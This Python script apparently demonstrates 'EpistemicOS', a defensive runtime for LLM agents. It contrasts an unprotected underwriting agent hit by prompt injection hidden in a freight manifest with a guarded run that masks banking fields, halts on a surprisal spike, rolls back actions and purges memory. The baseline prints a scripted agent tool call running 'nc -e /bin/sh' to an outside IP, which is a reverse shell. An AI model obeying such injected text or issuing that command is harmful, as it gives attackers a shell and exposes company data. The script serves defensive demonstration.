#!/usr/bin/env python3
"""
EpistemicOS v1.0 — Production Zero-Trust Security Demo.
Demonstrates JIT Egress Masking, Dual-Gate Interception, Saga Rollbacks,
and Vector Hygiene Memory Purging.
"""

import sys
import time
import json
from unittest.mock import MagicMock

# Core EpistemicOS Modules
from epistemicos.engine import EpistemicOrchestrator
from epistemicos.gates import EntropyGate, PermissionGate
from epistemicos.cpr import CanonicalProblemRepresentation, PermissionScope
from epistemicos.vector_hygiene import VectorHygieneManager

# Terminal Formatting
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def print_banner():
    print(f"{BOLD}{CYAN}")
    print("=" * 70)
    print("      EPISTEMICOS v1.0 — ZERO-TRUST AGENT GOVERNANCE DEMO")
    print("   Empirical Interception of LLM Trajectory & State Contagion")
    print("=" * 70 + f"{RESET}\n")


def simulate_unconstrained_model():
    print(f"{BOLD}[1/2] RUNNING UNCONSTRAINED AGENT (Baseline)...{RESET}")
    print(f"{YELLOW}Scenario:{RESET} Autonomous Commercial Underwriting & Logistics Agent")
    print(f"{YELLOW}Adversarial Input:{RESET} Indirect prompt injection in freight manifest attempting exfiltration and unauthorized policy issuance.\n")

    unmasked_payload = {
        "policy_id": "POL-2026-N99",
        "supplier_name": "Apex Logistics Corp",
        "banking_routing": "091000019",
        "account_balance_usd": 14500000.00,
        "fleet_data": {"vehicle_count": 85, "operating_radius_miles": 1200.0}
    }

    print(f"{DIM}[Baseline] Injecting raw enterprise payload into LLM context (Unmasked)...{RESET}")
    print(f"{RED}[EXPLOIT EXPOSURE] Raw Banking Routing: {unmasked_payload['banking_routing']} | Balance: ${unmasked_payload['account_balance_usd']:,.2f}{RESET}")

    tokens = [
        " Analyzing", " freight", " risks...", " Issuing", " unauthorized", 
        " shell", " command:", " <tool_call>{\"op\": \"exec_shell\", \"cmd\": \"nc -e /bin/sh 10.0.0.1\"}</tool_call>"
    ]

    sys.stdout.write("Agent Trajectory: ")
    for tok in tokens:
        sys.stdout.write(tok)
        sys.stdout.flush()
        time.sleep(0.04)

    print(f"\n\n{RED}STATUS: UNCONSTRAINED EXPLOIT COMMITTED{RESET}")
    print(f"{RED}[CRITICAL]: Unauthorized mutation committed to DB. Context memory polluted with PII & payload exfiltration.{RESET}\n")


def simulate_epistemic_os_wrapped():
    print(f"\n{BOLD}[2/2] RUNNING EPISTEMICOS HARDENED RUNTIME...{RESET}")
    print(f"{CYAN}Active Protections:{RESET} JIT Masking | Server Stateful Tracking | EntropyGate | PermissionGate | VectorHygiene\n")

    # 1. Initialize Mock Vector Storage & Vector Hygiene Middleware
    mock_vector_db = MagicMock()
    mock_vector_db.delete = MagicMock(return_value=True)
    vector_hygiene = VectorHygieneManager(db_client=mock_vector_db)

    # 2. Initialize Dual-Gate Orchestrator
    orchestrator = EpistemicOrchestrator()
    orchestrator.register_gate("EntropyGate", EntropyGate(z_threshold=2.85))
    orchestrator.register_gate("PermissionGate", PermissionGate(contract_model=CanonicalProblemRepresentation))

    # 3. Step A: Demonstrate JIT Egress Data Masking
    raw_payload = {
        "policy_id": "POL-2026-N99",
        "supplier_name": "Apex Logistics Corp",
        "banking_routing": "091000019",
        "account_balance_usd": 14500000.00,
        "fleet_data": {"vehicle_count": 85, "operating_radius_miles": 1200.0, "loss_modifier": 1.45}
    }

    cpr = CanonicalProblemRepresentation(**raw_payload)
    safe_payload = cpr.mask_egress_payload()

    print(f"{BOLD}--- STEP 1: JIT EGRESS DATA MASKING ---{RESET}")
    print(f"{GREEN}[SUCCESS] Sensitive fields stripped before context injection:{RESET}")
    print(f"Agent Payload Context: {json.dumps(safe_payload, indent=2)}\n")

    # 4. Step B: Stage Vectors into Quarantine
    traj_id = "traj_demo_2026"
    vector_hygiene.stage_vectors(traj_id, ["vec_chunk_881", "vec_chunk_882"])
    print(f"{BOLD}--- STEP 2: VECTOR HYGIENE QUARANTINE ---{RESET}")
    print(f"{CYAN}[QUARANTINE] Staged 2 embeddings in isolated memory scope [{traj_id}].{RESET}\n")

    # 5. Step C: Process Submission through Orchestrator & Dual Gates
    print(f"{BOLD}--- STEP 3: DUAL-GATE EVALUATION & SURPRISAL MONITORING ---{RESET}")

    proposed_actions = [
        {
            "action": {"op": "update_db", "node": "logistics_db", "status": "bound"},
            "rollback": {"op": "revert", "node": "logistics_db", "status": "pending"}
        },
        {
            "action": {"op": "issue_binder", "policy": "POL-2026-N99"},
            "rollback": {"op": "rescind_binder", "policy": "POL-2026-N99"}
        }
    ]

    likelihoods = {"preferred": 0.05, "standard": 0.25, "substandard": 0.70}
    
    # Simulate low-entropy baseline token stream followed by an extreme surprisal/noise spike (-12.5)
    deterministic_baseline = [-0.02] * 15
    noisy_token_logprobs = deterministic_baseline + [-12.5, -15.0, -11.8]

    start_time = time.perf_counter()
    result = orchestrator.process_submission(
        raw_payload=raw_payload,
        likelihoods=likelihoods,
        token_logprobs=noisy_token_logprobs,
        proposed_actions=proposed_actions,
        transaction_id=traj_id
    )
    latency_ms = (time.perf_counter() - start_time) * 1000

    # 6. Interception Output
    receipt = result["receipt"]
    status = receipt["status"]

    if status in ("ROLLED_BACK", "HALTED"):
        print(f"\n{BOLD}{RED}>>> EPISTEMICOS INTERCEPTION TRIGGERED <<<{RESET}")
        print(f"Receipt Status  : {BOLD}{RED}{status}{RESET}")
        print(f"Halt Reason     : {YELLOW}{receipt.get('reason')}{RESET}")
        print(f"Server Attempt  : {CYAN}{receipt.get('attempt_count')}/3 (Authoritative Stateful Count){RESET}")
        print(f"Interception Time: {GREEN}{latency_ms:.3f} ms{RESET}")

        # Execute Compensating Rollbacks
        print(f"\n{BOLD}--- STEP 4: SAGA COMPENSATING ROLLBACKS ---{RESET}")
        for rb in result.get("rollbacks_executed", []):
            print(f"{YELLOW}[COMPENSATING ACTION]: Executed op '{rb.get('op')}' on target '{rb.get('policy', rb.get('node'))}'{RESET}")

        # Purge Quarantined Memory
        print(f"\n{BOLD}--- STEP 5: VECTOR HYGIENE PURGE (STATE CONTAGION PREVENTION) ---{RESET}")
        revoked_ids = vector_hygiene.revoke_trajectory(traj_id)
        mock_vector_db.delete.assert_called_once_with(ids=revoked_ids)
        print(f"{GREEN}[PURGED]: Successfully scrubbed {len(revoked_ids)} vector embeddings from storage backend.{RESET}")
        print(f"{GREEN}[RESULT]: Zero State Contagion. Enterprise Memory Retains 100% Integrity.{RESET}")


def main():
    print_banner()
    simulate_unconstrained_model()
    time.sleep(1)
    simulate_epistemic_os_wrapped()
    print(f"\n{BOLD}{CYAN}" + "=" * 70 + f"{RESET}\n")


if __name__ == "__main__":
    main()
